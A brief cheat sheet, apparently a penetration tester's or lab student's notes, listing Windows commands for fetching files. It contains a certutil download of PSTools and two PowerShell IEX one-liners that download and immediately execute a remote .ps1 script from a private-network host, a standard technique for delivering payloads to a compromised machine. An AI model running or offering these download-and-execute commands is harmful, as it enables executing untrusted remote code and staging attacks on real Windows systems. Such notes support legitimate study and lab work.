# commands
DOS command to download http
`certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip`

Powershell command to download and execute script:
`powershell -c "IEX(New-Object Net.WebClient).downloadString('http://192.168.49.213/ouzmetbb.ps1')"`
`IEX(New-Object Net.WebClient).downloadString('http://192.168.49.213/ouzmetbb.ps1')`
